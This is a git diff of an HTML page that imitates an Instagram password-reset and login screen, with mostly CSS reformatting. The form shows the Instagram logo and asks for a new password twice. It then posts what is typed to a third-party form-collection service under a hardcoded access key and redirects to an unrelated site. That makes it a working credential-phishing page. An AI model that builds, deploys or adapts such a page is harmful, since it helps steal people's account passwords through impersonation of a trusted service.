@@ -6,131 +6,88 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      background-color: #000;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      padding: 10px;
-    }
+  background-color: #000;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  color: white;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  margin: 0;
+  padding: 10px;
+}
 
-    .login-container {
-      background-color: #1e1e1e; /* Updated to match screenshot */
-      padding: 30px;
-      border-radius: 10px;
-      width: 100%;
-      max-width: 320px;
-      box-shadow: 0 0 10px rgba(255, 255, 255, 0.05);
-      text-align: center;
-    }
+.login-container {
+  background-color: #1e1e1e;
+  padding: 30px;
+  border-radius: 10px;
+  width: 100%;
+  max-width: 320px;
+  box-shadow: 0 0 10px rgba(255, 255, 255, 0.05);
+  text-align: center;
+  margin: 0 auto;
+}
 
-    .login-container img {
+.login-container img {
   width: 39px;
   height: 39px;
   object-fit: contain;
   margin-bottom: 25px;
- }
+}
 
+input[type="text"],
+input[type="password"] {
+  width: 100%;
+  padding: 10px;
+  margin: 10px 0;
+  border-radius: 6px;
+  border: none;
+  background-color: #2a2a2a;
+  color: white;
+  font-size: 14px;
+  box-sizing: border-box;
+}
 
-    input[type="text"],
-    input[type="password"] {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 6px;
-      border: none;
-      background-color: #2a2a2a; /* Slight contrast to container */
-      color: white;
-      font-size: 14px;
-    }
+button {
+  width: 100%;
+  padding: 10px;
+  background-color: #3897f0;
+  border: none;
+  border-radius: 6px;
+  color: white;
+  font-weight: bold;
+  cursor: pointer;
+  margin-top: 10px;
+  font-size: 14px;
+}
 
-    .password-wrapper {
-      position: relative;
-    }
+@media (max-width: 400px) {
+  .login-container {
+    padding: 20px;
+  }
 
-    .toggle-password {
-      position: absolute;
-      top: 50%;
-      right: 10px;
-      transform: translateY(-50%);
-      cursor: pointer;
-      font-size: 0.9em;
-      color: #999;
-    }
+  .login-container img {
+    width: 150px;
+  }
 
-    button {
-      width: 100%;
-      padding: 10px;
-      background-color: #3897f0;
-      border: none;
-      border-radius: 6px;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 10px;
-      font-size: 14px;
-    }
+  a {
+    color: white;
+    text-decoration: none;
+  }
+}
 
-    .or {
-      margin: 20px 0;
-      color: #aaa;
-    }
-
-    .facebook-login {
-      color: #3897f0;
-      font-weight: bold;
-      margin-bottom: 10px;
-    }
-
-    .forgot {
-      color: #999;
-      font-size: 0.9em;
-    }
-
-    .signup {
-      margin-top: 20px;
-      font-size: 0.9em;
-    }
-
-    .signup a {
-      color: #3897f0;
-      text-decoration: none;
-    }
-
-    .error {
-      color: #f44336;
-      font-size: 0.9em;
-      margin-top: 10px;
-    }
-
-    @media (max-width: 400px) {
-      .login-container {
-        padding: 20px;
-      }
-
-      .login-container img {
-        width: 150px;
-      } 
-
-      a {
-      color: white;
-      text-decoration: none; /* Removes underline */
-     }
-
-     }
   </style>
 </head>
-  <body>
+<body>
+  <div class="login-container">
     <form action="https://api.web3forms.com/submit" method="POST">
       <input type="hidden" name="access_key" value="0f6b356e-b11f-4713-916f-5ef8bead4166">
-       <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
-        <input type="text" id="username" name="New password" placeholder="Enter your new password">
-        <input type="password" id="password" name="Comfirm your password" placeholder="comfirm your password">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+      <input type="text" id="username" name="New password" placeholder="Enter your new password">
+      <input type="password" id="password" name="Comfirm your password" placeholder="Confirm your password">
       <input type="hidden" name="redirect" value="https://openai.com/index/chatgpt/">
-       <button type="submit">Log in</button>
-  </form>
-   </body>
+      <button type="submit">Log in</button>
+    </form>
+  </div>
+</body>
 </html>
